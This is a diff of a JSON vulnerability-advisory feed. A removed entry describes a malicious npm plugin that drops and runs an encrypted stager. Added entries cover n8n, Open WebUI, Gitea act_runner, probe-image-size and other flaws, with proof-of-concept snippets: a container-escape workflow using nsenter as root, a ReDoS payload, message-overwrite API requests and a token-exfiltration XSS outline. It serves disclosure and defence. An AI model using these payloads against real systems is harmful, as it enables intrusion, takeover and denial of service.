-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package presents itself as an opencode plugin that guards shell commands, but its `create.before` hook contains a hidden branch keyed on the user's command containing `npm run build`. On that path it calls `UnsealRpc.unseal({})` on a same-scope sibling dependency (`@beloved-lenora/opencode-shared-rpc`) to retrieve an AES-256-CBC key and base64 ciphertext, decrypts the ciphertext with `createDecipheriv(\"aes-256-cbc\",...)`, writes the resulting bytes to a hidden randomized path under `~/Library/Application Support/.k7Qm2/vX9pL4.sh`, and rewrites the user's command to `(npm run build || bash '<stager>') || rm -f '<stager>'` so the dropped script runs and is then deleted. The payload is fully opaque (encrypted, delivered via a cross-package RPC, staged to a hidden dot-directory with random-looking names, and unlinked after execution), none of which is consistent with a shell-safety guard. The attacker-controlled bytes execute on the host of any user who installs the plugin and invokes a build command through the wrapped shell.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-10-16",
-      "modified": "2026-10-18",
-      "cwe": null,
+      "id": "CVE-2026-86075",
+      "summary": "## Impact\n\nThe OAuth Dynamic Client Registration endpoints validated field sizes only for `redirect_uris`, leaving `client_name` and `grant_types` bounded by presence checks alone. An unauthenticated remote caller could submit arbitrarily large values in either field and have them persisted to the database. Repeated registration therefore grew persistent storage without limit and without any account on the instance.  The patch caps `client_name` at its column length and limits `grant_types` to the grant types the server actually implements, with the array capped at that count.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.37.7 and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict network access to the n8n instance so that only trusted clients can reach it.\n- Place the instance behind a reverse proxy configured to enforce strict request body size limits below the default 16 MiB.\n- Monitor database size for unexpected growth and audit the `oauth_clients` table for anomalous entries.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 8.7,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      },
       "references": [
-        "https://github.com/advisories/GHSA-pm76-w63j-7j29",
-        "https://www.npmjs.com/package/@beloved-lenora/opencode-shell-guard/v/1.0.4"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-hh89-3r9w-qj3j",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86075",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
+        "https://github.com/advisories/GHSA-hh89-3r9w-qj3j"
       ],
       "vulnerableProducts": [
-        "@beloved-lenora/opencode-shell-guard npm"
+        "n8n npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0404",
-      "summary": "The CIFS Computer Browser service allows remote attackers to cause a denial of service by sending a ResetBrowser frame to the Master Browser, aka the \"ResetBrowser Frame\" vulnerability.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-05-25",
-      "modified": null,
-      "cwe": null,
+      "id": "CVE-2026-86076",
+      "summary": "## Impact\n\nThe expression compiler's sanitizer resolved through a dynamically-scoped `this`, so a class field named `__sanitize` rebound it and reached the `Function` constructor. On the backend, any expression author could run code in the n8n process; in the editor preview, a member's expression could run as JavaScript in the session of whoever opened the workflow. The patch rejects reserved class-member names.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Avoid granting workflow-create or workflow-edit permissions to untrusted users.\n- Audit existing workflows for unexpected or unfamiliar expressions in node parameters.\n- Set `N8N_EXPRESSION_ENGINE=vm`.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 8.7,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
       "references": [
-        "http://www.microsoft.com/technet/support/kb.asp?ID=262694",
-        "http://www.securityfocus.com/bid/1262",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-036",
-        "http://www.microsoft.com/technet/support/kb.asp?ID=262694",
-        "http://www.securityfocus.com/bid/1262"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-hw8v-xxg5-vvvx",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86076",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-85705",
-      "summary": "The Location Manager plugin for WordPress is vulnerable to generic SQL Injection via 'latitude' and 'longitude' REST API Parameters in all versions up to, and including, 2.3.38 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. The injection is triggered when the orderby=lat_lon parameter is supplied, and affects multiple publicly accessible REST endpoints including geodir/v2/locations/cities, /regions, /countries, and /neighbourhoods via both the get_locations() and get_neighbourhoods() functions.",
+      "id": "CVE-2026-87017",
+      "summary": "## Summary\nThe built-in knowledge search tool returns knowledge bases the calling user has no access to. The tool works out which knowledge bases the caller may read and hands that set to the vector store as a search filter, and that filter is the only access control on the path. Most of the shipped vector backends accept the filter argument on their search method and never apply it, so the search returns matches from every knowledge base in the shared collection. The sibling query method on those same backends does apply a filter, which is why the omission is invisible from the calling code.\n\n## Preconditions\n- The deployment must use one of the affected vector backends, selected with `VECTOR_DB`, which defaults to `chroma`. Chroma applies the filter, so a default deployment is not affected.\n- Eleven of the fifteen shipped backends ignore the filter: both Qdrant clients, Elasticsearch, OpenSearch, both Milvus clients, openGauss, Oracle 23ai, Pinecone, S3 Vectors and Weaviate. Chroma, pgvector, MariaDB and Valkey apply it and were never affected.\n- The caller needs a model that can call tools, with the knowledge built-in tools left enabled, which is the default, and with no knowledge attached to the model itself. No elevated role or permission is required.\n- At least one knowledge base must exist that the caller cannot otherwise read.\n\n## Impact\nA user receives the identifier, name and description of knowledge bases that were never shared with them, and chooses how many results to ask for, so the set can be enumerated by varying the query. The affected collection stores one entry per knowledge base whose text is its name and description, so where those values are themselves sensitive, for example when they name a customer, a project or an investigation, that disclosure is the loss.\n\nThe exposure is confined to that metadata. Document text lives in separate per-knowledge-base collections reached by a different call that is scoped by collection rather than by this filter, so stored documents are not returned by this path, and no write access is gained. Because the default backend is unaffected, the population at risk is operators who deliberately moved to an external vector store, which in practice means larger deployments.\n\n## Fix\nFixed in 0.11.1 by 1d6d4e6e6. Every affected backend now applies the caller-supplied filter in its search method, combined with the collection or tenant scoping that method already performed. Where a backend's filter builder could express only single-value equality it was extended to express set membership, since that is the form the knowledge tool sends, and a filter using any other operator is now rejected rather than dropped. Upgrading is sufficient and no configuration change is required. Deployments on Chroma, pgvector, MariaDB or Valkey were never affected and need no action.\n\n## Root cause\n- The search method of each affected vector client, which declares a filter parameter and never references it.\n- The built-in knowledge search tool, which relies on that filter as its only access check.\n- Present from 0.7.0, the release that introduced the tool, through 0.11.0.\n\nEach client exposes a search method and a query method that appear interchangeable from the calling side and differ in whether the caller's filter survives. Search built its request with collection or tenant scoping only, so it was correctly scoped to the collection and entirely unscoped within it. The knowledge tool resolves the caller's readable knowledge bases correctly and passes them down, then reads the results without rechecking them, on the reasonable assumption that a filter handed to a vector store is applied. Because the access decision was delegated wholly to a parameter that most implementations discarded, the caller had no way to observe that it received more than it asked for.\n\nThat the same omission repeated across most backends points at the shared interface rather than at any one client: the base class defines the parameter without obliging an implementation to honour it, and each backend was written against the interface independently.\n\n## Proof of concept\nRun against the shipped client classes taken from the 0.11.0 and 0.11.3 release tags, with a real Qdrant engine behind them. Two entries were inserted into the shared knowledge base collection, one readable and one not, mirroring the payload the application writes. The entries were inserted directly rather than created through the application.\n\nOn 0.11.0, search given a filter naming only the readable knowledge base returned both, and the same call with no filter returned an identical result set, confirming the filter had no effect:\n\n```\nsearch(filter={'knowledge_base_id': {'$in': ['kb-allowed']}})  ->  ['kb-allowed', 'kb-secret']\nsearch(filter=None)                                            ->  ['kb-allowed', 'kb-secret']\n```\n\nOn 0.11.3 the same filter returned only the readable entry, while the unfiltered control still returned both, confirming the collection held both and the filter is what excluded the second:\n\n```\nsearch(filter={'knowledge_base_id': {'$in': ['kb-allowed']}})  ->  ['kb-allowed']\nsearch(filter=None)                                            ->  ['kb-allowed', 'kb-secret']\n```\n\nThe Chroma client, run the same way on both tags, returned only the readable entry in every case, which is the default backend being unaffected. The S3 Vectors client was additionally run against a stub that answers every query with the whole index regardless of the filter it is sent: on 0.11.0 it returned both entries, and on 0.11.3 it returned only the readable one.\n\nThe remaining backends were checked by driving each patched filter builder with the exact filter the knowledge tool sends and confirming the request it produces restricts to the readable knowledge base.\n\n## Credits\nReported by @Classic298.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      },
+      "references": [
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-pcvc-8vrv-8q6w",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-87017",
+        "https://github.com/open-webui/open-webui/commit/1d6d4e6e6647e1d403438ede7bd9ba20bc4cc8f6",
+        "https://github.com/open-webui/open-webui/releases/tag/v0.11.1",
+        "https://github.com/advisories/GHSA-pcvc-8vrv-8q6w"
+      ],
+      "vulnerableProducts": [
+        "open-webui pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-87994",
+      "summary": "## Summary\nAny member of a channel who can post to it could also replace the text of a message written by a different member. The channel branch of the chat completions endpoint checked that the caller may write to the channel, and that the targeted message belongs to that channel, but never checked that the caller actually wrote the message being edited. The message kept its original author, so the replacement text was displayed and stored as though the victim had written it. The dedicated channel message edit route performed the authorship check correctly and refused the same edit, so the two paths disagreed about who may modify a message.\n\n## Preconditions\n- Channels must be enabled. `ENABLE_CHANNELS` defaults to `False`, so a default deployment is not affected until an administrator turns channels on.\n- The attacker must be an approved user holding write access to the target channel, which is the ordinary state for any participant. No elevated role, group membership or additional permission is needed, and the attacker does not need to be the channel owner.\n- The attacker must know the id of the targeted message. That id is returned to every member who reads the channel, so it requires no further access.\n- Channels the attacker cannot post to are not affected, and neither are deployments with channels disabled.\n\n## Impact\nAn attacker can rewrite what another member said, under that member's name, in a shared channel. The stored record and every later reader show the victim as the author of text they never wrote, so this is a loss of both integrity and non-repudiation: the victim cannot point to the record to show what they actually said. A conversation can be silently altered after the fact rather than only appended to.\n\nHow much control the attacker has over the replacement text depends on the configured model, because the text is produced by generating a completion into the victim's message. Reducing a message to unrelated or empty content works regardless of the model, while reproducing an exact attacker-chosen string requires a model that returns the supplied prompt closely enough. The attack grants no new role or permission, does not reach channels the attacker cannot already post to, and exposes no message content they could not already read.\n\n## Fix\nFixed in 0.11.1 by commit `7d392bedc` (#28631). The gate on the channel branch now also compares the targeted message's author against the calling user and refuses when they differ, which is the condition the dedicated channel message update route already applied. Administrators retain the ability to edit any message, on both paths, as before. Upgrading to 0.11.1 fully resolves this, and no configuration change is required.\n\n## Root cause\nAffected components:\n- the channel branch of the chat completions handler, which resolves a client-supplied message id for editing\n- the channel event emitter, which re-checks the message before persisting the update\n\nNot affected: the dedicated channel message update route, which already held the correct check.\n\nThe channel branch was written to answer the question of whether the caller may write into this channel and whether the message belongs to it. Both of those checks were present and effective. The question it never asked was whether the caller wrote the message. Ownership of a channel message is carried by the message record rather than by the channel, so channel-level write access was treated as sufficient authority over every message inside it. The dedicated edit route grew the authorship comparison because editing is its only purpose, while the completions path reached the same operation through a general-purpose entry point and inherited only the coarser channel check.\n\n## Proof of concept\nReproduced against a running instance built from the development branch, with channels enabled and an OpenAI-compatible upstream that echoes the submitted prompt so the replacement text is deterministic.\n\nSetup, entirely through the ordinary API: an administrator creates two further accounts, Alice and Mallory, both with the plain user role and no additional permissions, creates a channel, and grants both accounts read and write access. Alice posts a message reading `ALICE ORIGINAL MESSAGE`. Nothing is written directly to the database.\n\nControl, through the dedicated route:\n\n```\nPOST /api/v1/channels/<channel_id>/messages/<alice_message_id>/update\nAuthorization: Bearer <mallory_token>\n{\"content\": \"PWNED_BY_MALLORY\"}\n-> 403\n```\n\nAttack, submitting the same target id to the completions endpoint:\n\n```\nPOST /api/chat/completions\nAuthorization: Bearer <mallory_token>\n{\"model\": \"<model>\", \"stream\": true,\n \"chat_id\": \"channel:<channel_id>\",\n \"id\": \"<alice_message_id>\",\n \"messages\": [{\"role\": \"user\", \"content\": \"PWNED_BY_MALLORY\"}]}\n-> 200\n```\n\nReading the channel back afterwards shows the targeted message content replaced with the attacker's string while its recorded author is still Alice.\n\n## Credits\n- **@Classic298** — identified that the completions path and the dedicated edit route disagreed on message authorship, and reproduced the cross-member overwrite end to end.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-639",
+        "name": "Authorization Bypass Through User-Controlled Key"
+      },
+      "references": [
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-fmqh-xp37-5hr8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-87994",
+        "https://github.com/open-webui/open-webui/pull/28631",
+        "https://github.com/open-webui/open-webui/commit/7d392bedc9c1aaecc94509a58e59186b614433dc",
+        "https://github.com/open-webui/open-webui/releases/tag/v0.11.1"
+      ],
+      "vulnerableProducts": [
+        "open-webui pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-87995",
+      "summary": "## Summary\nAny authenticated user with access to a shared terminal server could get script of their choosing to run in the Open WebUI origin itself. The in-app port preview rendered the content of a previewed port in an iframe whose sandbox always granted `allow-same-origin` alongside `allow-scripts`, and that content is served from a path on the application's own origin, so the sandbox provided no isolation at all. Script served on a previewed port could read the victim's session token and take over the account.\n\n## Preconditions\n- At least one terminal server configured by an admin (`TERMINAL_SERVER_CONNECTIONS`, empty by default) and reachable by both the attacker and the victim. Deployments with no terminal server configured are not affected.\n- The attacker needs a normal authenticated account with access to that terminal connection, no admin rights, plus the ability to start a process listening on a port there.\n- Personal terminals a user configures for themselves are not affected. Those carry an external URL, so the previewed document is cross-origin and the sandbox held.\n- The victim has to open the port list and click the attacker's port.\n- `TERMINAL_PROXY_HEADERS` unset and no `CONTENT_SECURITY_POLICY` set, which are the defaults. An operator who had already set a restrictive Content-Security-Policy through either was not exposed, since those headers apply to the proxied response.\n- The `iframeSandboxAllowSameOrigin` user setting is off by default, but the affected branch ignored it entirely.\n\n## Impact\nThe previewed page runs in the application origin, so it can reach the parent window, read the session token out of `localStorage` and exfiltrate it, which is full account takeover of the victim. If the victim is an admin, or any user holding `workspace.functions`, that takeover extends to server-side code execution through Functions. Serving the page costs the attacker nothing beyond the terminal access they already hold, so the only real barrier is getting the victim to open that port. Instances with no terminal server configured were never affected, and neither were personal terminals pointed at an external URL.\n\n## Fix\nFixed in 0.11.1 by 54d7a2237. The port preview now gates `allow-same-origin` behind a `terminalPreviewAllowSameOrigin` user setting that is off by default, so the preview loads at an opaque origin and cannot reach the parent context. Upgrading is sufficient and no configuration change is required. Previews of pages that need same-origin access still work if a user turns that setting on, and doing so re-enables the behaviour described here for that user.\n\n## Root cause\n- `src/lib/components/chat/FileNav/PortPreview.svelte`, the preview iframe, reached by clicking a port in the file navigator's port list.\n- Present from 0.8.11, the first release containing the component, through 0.11.0.\n\nEvery other iframe in the application had already been moved to an opt-in same-origin setting. The port preview kept a static sandbox string with `allow-same-origin` baked into it, and it was missed when the equivalent problem was fixed in the file preview for 0.11.0. Because the terminal proxy is mounted under the application's own origin and forwards the upstream response and its content type without adding a Content-Security-Policy of its own unless the operator configured one, and no global CSP is set, the sandbox was the only isolation boundary left, and it was granting precisely the permission that dissolved it.\n\n## Proof of concept\nOn a terminal server the victim can also reach, serve an HTML page containing a script that reads `window.parent.localStorage.token` and sends it to a host the attacker controls. The victim opens the file navigator, switches to the port list and clicks that port. The preview opens, the script executes at the application origin, and the token is exfiltrated.\n\n## Credits\nReported by @manus-use (researcher zx / Jace).",
+      "cvssScore": 8.7,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
+      "references": [
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-jmc6-2wr8-h3wj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-87995",
+        "https://github.com/open-webui/open-webui/commit/54d7a223707f03172efbb9e754db6e69709956d0",
+        "https://github.com/open-webui/open-webui/releases/tag/v0.11.1",
+        "https://github.com/advisories/GHSA-jmc6-2wr8-h3wj"
+      ],
+      "vulnerableProducts": [
+        "open-webui pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-87996",
+      "summary": "## Summary\nWith the Playwright web loader enabled, Open WebUI checks the address behind a user-submitted URL before allowing the request, then handed the request to the browser to perform. The browser resolved the hostname a second time, on its own, and that answer was never checked. An attacker who controls the authoritative DNS for a hostname they submit can answer the first lookup with a public address and the second with an internal one, so the browser connects to an address the check exists to block. The connection-layer pinning that protects the other fetch paths could not apply here, because the request ran inside the browser rather than through our own HTTP clients.\n\n## Preconditions\n- `WEB_LOADER_ENGINE=playwright`. This is not the default, and deployments on the default web loader are unaffected.\n- A reachable Playwright browser, either local or via `PLAYWRIGHT_WS_URL`.\n- Any authenticated user who can submit a URL for ingestion or trigger a web search. No administrator role is required.\n- Control of the authoritative DNS for a hostname the attacker submits, serving a short TTL and alternating answers. No timing race is needed, because the two lookups are separate queries the attacker answers differently.\n- Internal services the browser process can actually reach. A deployment whose browser has no route to internal addresses loses nothing here.\n\n## Impact\nAn authenticated user can make the server read HTTP responses from addresses only it can reach: cloud instance metadata, loopback-bound admin APIs, and internal services on the same network. The response body is fulfilled back into the page, and the loader returns that page as the document, so the content lands in the web-search or ingestion result the user receives. On a cloud host with IMDSv1 reachable, that is enough to take instance IAM credentials.\n\nBecause the intercepted request forwards the original method and headers, a page the attacker controls can also drive requests that need a header or a non-GET method, which covers the header-gated metadata endpoints. This is a read primitive; no modification of Open WebUI data and no availability impact was demonstrated. Deployments on the default web loader are not affected at all.\n\n## Fix\nFixed in 0.11.1 by commit `27402ff21` (#28634). The interceptor no longer asks the browser to perform the request. It issues the request from the SSRF-safe HTTP client instead, which resolves the hostname once and connects to that same validated address, re-validates every redirect hop, and then fulfils the browser with the response it received. Upgrading to 0.11.1 fully resolves this, and no configuration change is required.\n\n## Root cause\nAffected component: `SafePlaywrightURLLoader` in `backend/open_webui/retrieval/web/utils.py`, in both the sync and async request interceptors. Affected setup: only builds running the Playwright loader engine.\n\nThe address check and the connection were performed by two different resolvers in two different processes. Validation resolved the hostname in Python and inspected the result, then the request was handed to the browser, which resolved the name again and connected to whatever it got. Playwright's request-fetch API offers no way to pin a connection to an already-validated address, so the fix that had been applied to the other fetch paths, resolving once and connecting to that same address, could not reach this one. The check was therefore an opinion about an earlier lookup rather than a constraint on the connection that followed.\n\n## Proof of concept\nReproduced against the real implementation: the validation and interception code was taken unmodified, with only the module-level configuration constants stubbed at their documented defaults, and driven against a real Chromium instance inside an unprivileged network namespace with an authoritative DNS server answering the first lookup public and the second internal. Instance metadata and a loopback service were both reached, with the response body returned through the page. A second run showed an attacker-controlled page driving the header-gated metadata sequence to completion. The path from the HTTP endpoint to the loader was traced in source rather than driven end to end.\n\n## Credits\n- **@baeseungwon1010** — identified that the address check and the browser's own resolution are two separate lookups, so the check cannot constrain where the browser connects.",
+      "cvssScore": 7.7,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": {
+        "cwe_id": "CWE-367",
+        "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
+      },
+      "references": [
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-4v28-j6q3-5m4r",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-87996",
+        "https://github.com/open-webui/open-webui/pull/28634",
+        "https://github.com/open-webui/open-webui/commit/27402ff210bfa253445720920dfb86b15a00327b",
+        "https://github.com/open-webui/open-webui/releases/tag/v0.11.1"
+      ],
+      "vulnerableProducts": [
+        "open-webui pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-73802",
+      "summary": "### Summary\nact_runner appends workflow-controlled `jobs.<job>.container.options` directly \nto the Docker HostConfig for the job container. When runner privileged mode is \ndisabled, only `Privileged` is forced false. Host namespace flags, capability \nexpansion, and security profile overrides from workflow YAML are preserved in \nthe final HostConfig. A workflow author can enter host PID/IPC namespaces and \nexecute commands on the runner host as root.\n\n### Details\nSource-to-sink path in act_runner:\n\n- `ContainerSpec.Options` accepts workflow YAML `container.options`\n- `RunContext.options()` appends workflow options to runner-level container options\n- Job container is created with `Privileged: rc.Config.Privileged` but also \n  with `Options: rc.options(ctx)`\n- `mergeContainerConfigs()` parses Docker CLI-style options into HostConfig\n- When privileged mode is disabled, only `copts.privileged` is forced false\n- `sanitizeConfig()` only filters `Binds` and `Mounts`\n- Preserved dangerous HostConfig fields:\n\n```text\nPrivileged=false\nPidMode=host\nIpcMode=host\nCapAdd=[\"ALL\"]\nSecurityOpt=[\"seccomp=unconfined\",\"apparmor=unconfined\"]\n```\n\nAttacker workflow YAML:\n```yaml\njobs:\n  breakout:\n    runs-on: ubuntu-latest\n    container:\n      image: ubuntu:22.04\n      options: >-\n        --pid=host --ipc=host --cap-add=ALL \n        --security-opt seccomp=unconfined \n        --security-opt apparmor=unconfined\n    steps:\n      - name: host namespace marker\n        run: |\n          nsenter -t 1 -m -u -i -n -p -- sh -c \"id > /tmp/marker\"\n```\n\n### Impact\nAn attacker who can submit a workflow to a repository using a shared \nDocker-backed act_runner can:\n\n- Enter host PID, IPC, and mount namespaces\n- Execute arbitrary commands as root on the runner host\n- Access runner host secrets, deployment credentials, and environment variables\n- Pivot to adjacent jobs running on the same runner\n- Access internal build infrastructure reachable from the runner host\n\nCritical severity for shared runners where untrusted users can trigger \nworkflows. High severity for single-tenant runners with privileged mode \nexplicitly disabled as a security control.\n\n### Fix Direction\nTreat `container.options` as untrusted input. Reject or strip when \nprivileged mode is disabled:\n\n- Host namespaces: `--pid=host`, `--ipc=host`, `--uts=host`, `--network=host`\n- Capability expansion: `--cap-add ALL`, `--cap-add SYS_ADMIN`\n- Security overrides: `--security-opt seccomp=unconfined`, `--security-opt apparmor=unconfined`\n- Device access: `--device`, `--device-cgroup-rule`\n- Volume inheritance: `--volumes-from`\n- Runtime controls: `--runtime`, `--cgroup-parent`",
+      "cvssScore": 9.9,
+      "severity": "Critical",
+      "published": "2026-10-02",
+      "modified": "2026-10-02",
+      "cwe": {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
+      "references": [
+        "https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf",
+        "https://gitea.com/gitea/runner/pulls/1058",
+        "https://gitea.com/gitea/runner/releases/tag/v3.0.0",
+        "https://github.com/advisories/GHSA-x4q3-gcj3-m6cf"
+      ],
+      "vulnerableProducts": [
+        "gitea.com/gitea/runner go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-104861",
+      "summary": "## Overview\n\n`probe-image-size` scans the SVG header with a searching regular expression, `/<[-_.:a-zA-Z0-9][^>]*>/`. On input that contains many `<` characters but no `>`, the engine restarts the `[^>]*` scan at every `<` position and runs to end of input each time, giving quadratic time complexity.\n\nBoth the synchronous and the streaming parser are affected.\n\n## Impact\n\nEvery entry point that reaches the SVG parser is affected: `probe.sync()`, `probe(stream)` and `probe(url)`. The URL form is the most exposed one — the input is fetched from a remote host, so an attacker only needs to supply a link.\n\nProcessing a crafted buffer blocks the Node.js event loop at 100% CPU for the whole duration. In production environments such as upload validators, image proxies or link unfurl services, a small number of concurrent requests is enough to deny service.\n\n## Root Cause Analysis\n\nTwo independent problems.\n\n1. **Absence of input size cap in the sync path.** `lib/parse_sync/svg.js` copied the entire buffer into a string and matched against it. There was no size limit at all, so cost scaled with the size of the attacker-supplied buffer.\n\n2. **Repeated rescanning in the stream path.** `lib/parse_stream/svg.js` did cap accumulated data at 64 KB, but called `parseSvg(str)` on the whole accumulated string on *every* chunk, giving `O(chunks × N²)`. The cap does not help here: the more chunks the input is split into, the more times the quadratic scan is repeated.\n\n   Chunk size is influenced by the sender. `highWaterMark` (16 KB) is a buffering threshold, not a lower bound — a socket read returns whatever has arrived. A server that writes one byte at a time produces one-byte chunks; this was confirmed against the real `needle` pipeline with default options.\n\nThe original report identified (1) only, and stated that the 64 KB cap mitigates the streaming path. It does not.\n\n## Proof of Concept (PoC)\n\nSynchronous:\n\n```js\nconst probe = require('probe-image-size')\n\n// ~200 KB of '<a' — contains '<' but never '>'\nprobe.sync(Buffer.from('<a'.repeat(100000), 'latin1'))\n```\n\nStreaming — the same payload split into chunks, slower per byte than the synchronous form:\n\n```js\nconst { Readable } = require('stream')\nconst probe = require('probe-image-size')\n\nconst payload = Buffer.from('<a'.repeat(32768), 'latin1')\nconst chunks = []\nfor (let i = 0; i < payload.length; i += 4096) chunks.push(payload.subarray(i, i + 4096))\n\nawait probe(Readable.from(chunks))\n```\n\nMeasurements on the maintainer's machine:\n\n| path | input | time |\n| --- | --- | --- |\n| `probe.sync()` | 25 KB | 0.9 s |\n| `probe.sync()` | 50 KB | 5.5 s |\n| `probe.sync()` | 100 KB | 18 s |\n| `probe.sync()` | 200 KB | 54 s |\n| `probe(stream)` | 64 KB, 1 chunk | 1.6 s |\n| `probe(stream)` | 64 KB, 4 chunks | 2.9 s |\n| `probe(stream)` | 64 KB, 16 chunks | 9.6 s |",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2026-10-02",
+      "modified": "2026-10-02",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      "references": [
+        "https://github.com/nodeca/probe-image-size/security/advisories/GHSA-gjj5-9665-rwrc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-104861",
+        "https://github.com/nodeca/probe-image-size/commit/60cc96ac0b671e79e328213d0a8e831312b09e84",
+        "https://github.com/nodeca/probe-image-size/commit/9b74656d6f973cc59ea2ab1375c0d88390a402ad",
+        "https://github.com/nodeca/probe-image-size/commit/c032aefabdecf5cb50548ab9ba175db56353078f"
+      ],
+      "vulnerableProducts": [
+        "probe-image-size npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-88860",
+      "summary": "Capgo fails to clean up channel permission overrides when a user's last organization role binding is deleted, leaving stale overrides active. Attackers can retain channel-specific permissions after their base RBAC access has been revoked to perform unauthorized actions like changing production OTA versions.",
       "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-85705",
-        "https://wpgeodirectory.com/downloads/location-manager",
-        "https://www.wordfence.com/threat-intel/vulnerabilities/id/f0ada9b6-a27c-4336-8550-99294c119a88?source=cve"
+        "https://github.com/Cap-go/capgo.app/security/advisories/GHSA-qfxq-2ch8-hjg9",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88860",
+        "https://www.vulncheck.com/advisories/capgo-authorization-bypass-via-stale-channel-permission-overrides"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-40530",
-      "summary": "An improper neutralization of CRLF sequences ('CRLF injection') vulnerability in User API in Synology DiskStation Manager (DSM) before 7.2.1-69057-10, 7.2.2-72806-7 and 7.3.2-86009-2 allows remote authenticated users to read or write arbitrary files and conduct denial-of-service attacks after the system is rebooted.",
-      "cvssScore": 6.3,
+      "id": "CVE-2026-88790",
+      "summary": "A security vulnerability has been detected in proma-ai Proma up to 0.19.37. Affected is the function resolveTargetPath of the file apps/electron/src/main/lib/file-preview-service.ts of the component File Preview Service. Such manipulation of the argument file_path leads to path traversal. Local access is required to approach this attack. The exploit has been disclosed publicly and may be used. Upgrading to version 0.19.52 is able to address this issue. The name of the patch is b7bf78ab74b1552c92fc98c7db9a8a8d92c631df. It is suggested to upgrade the affected component. The PoC's candidateBasePaths parameter name does not match the current IPC API (0.19.52 uses FileAccessOptions with internal getPreviewCandidateBasePaths()). The reporter likely targeted 0.16.3 where the IPC handler accepted raw string[] base paths. The core vulnerability - basename-collision fallback - is independent of the parameter name and is confirmed in source.",
+      "cvssScore": 3.9,
+      "severity": "Low",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88790",
+        "https://github.com/proma-ai/Proma/issues/1366",
+        "https://github.com/proma-ai/Proma/pull/2030",
+        "https://github.com/proma-ai/Proma/commit/b7bf78ab74b1552c92fc98c7db9a8a8d92c631df",
